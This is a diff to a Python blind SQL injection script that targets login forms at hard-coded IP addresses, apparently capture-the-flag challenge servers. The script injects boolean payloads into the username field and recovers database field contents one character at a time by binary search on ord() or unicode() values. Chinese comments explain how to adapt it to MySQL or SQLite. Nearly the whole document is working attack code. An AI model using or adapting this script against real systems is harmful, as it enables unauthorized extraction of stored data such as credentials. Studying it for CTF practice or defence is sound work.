@@ -2,21 +2,39 @@
 
 import requests
 from argparse import ArgumentParser
-url= 'http://111.198.29.45:32197/login.php'
+
+raw_payload= "admin' or %s and '1'='1 "
+
+
+
+
+#url,必须修改
+url= 'http://35.190.155.168:5001/c3c5d49d5d/login'
 ss = requests.session()
 
-raw_payload="usr=hi' or (({sql}){condition} and 1) --&pw=1"
+#核心判断字段语句,必须修改。真则正确，假则错误
+##eg.raw_payload="{id}=' or ({sql}){condition} and '1'='1"
+raw_payload="admin' or ({sql}){condition} and '1'='1"
+#判断长度,一般不会改变
+##eg.
 length_sql = "select length(group_concat({field})) from {table} where {where}"
-#sqlite中没有ord,只有unicode
-field__sql = "select unicode(substr(group_concat({field}),{index},1)) from {table} where {where}"
-def post(sql,condition,isPrint=True):
-    headers={"Content-Type":"application/x-www-form-urlencoded"}
+
+#猜表语句,sqliet用unicode,mysql用ord
+#field__sql = "select unicode(substr(group_concat({field}),{index},1))) from {table} where {where}"
+field__sql = "select ord(substr(group_concat({field}),{index},1)) from {table} where {where}"
+
+
+#核心函数，必须修改，判断正确与否
+
+def post(sql,condition,isPrint=False):
     payload = raw_payload.format(sql=sql,condition=condition)
-    res = ss.post(url,data=payload,headers=headers)
     if isPrint:
         print("payload:%s"%payload)
-        #print(res.headers)
-    if 'Set-Cookie' in res.headers.keys():
+    data={"username":payload,"password":"1"}
+    res = ss.post(url,data=data)
+    content = res.content.decode("utf-8")
+    if 'Invalid' in content:
+        #print(content)
         return True
     else:
         return False
@@ -34,6 +52,7 @@ def binary_search_value(field, table, where, total_length):
         sql = field__sql.format(field=field, table=table, index=i, where=where if where else '1')
         value = chr(binary_search(sql,0,128))
         result += value
+        print("[+]results:%s"%result)
     print('查询结束，表: %s 中字段: %s 的内容为: %s' % (table, field, result))
     return result
 
